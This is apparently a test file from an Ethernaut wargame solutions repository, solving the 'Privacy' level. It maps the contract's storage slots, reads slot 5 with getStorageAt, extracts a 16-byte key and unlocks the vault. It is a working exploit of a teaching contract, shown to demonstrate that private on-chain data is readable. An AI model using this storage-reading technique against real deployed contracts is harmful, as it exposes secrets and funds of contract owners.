const PrivacyFactory = artifacts.require('./levels/PrivacyFactory.sol')
const Privacy = artifacts.require('./levels/Privacy.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")
const chai = require("chai")
const { solidity } = require("ethereum-waffle")
chai.use(solidity);


describe("Challenge 12 - Privacy", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await PrivacyFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Privacy,
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("vault is locked", async function () {
            expect(await instance.locked()).to.be.true
        })

        it("random key should not unlock it", async function () {
            await expect(instance.unlock("0xabcd")).to.be.reverted
            expect(await instance.locked()).to.be.true
        })
    })

    describe("Attack Execution", function () {
        /*
            We will have to retrieve the key from storage.
            Contract storage looks like this:

            slot #
            0       bool public locked = true;
            1       uint256 public ID = block.timestamp;
            2       uint8 private flattening = 10;
            2       uint8 private denomination = 255;
            2       uint16 private awkwardness = uint16(block.timestamp);
            3,4,5   bytes32[3] private data;

            We see that key is set to data[2] so we are interested in slot 5
        */

        it("vault is unlocked", async function () {
            const storage = await web3.eth.getStorageAt(instance.address, 5)

            /*
                We have the value stored in the storage value. Looking at
                the code we see that key is bytes16 data type. Since a full 
                word in solidity is 32 bytes long this means the key we are
                looking for will be half of the length of the storage value.

                We will get index 0 to 34 (first two characters are "0x")
                2 + 16 * 2 = 34 characters
            */
            const key = storage.substring(0, 34)
            await instance.unlock(key)

            expect(await instance.locked()).to.be.false
        })

    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})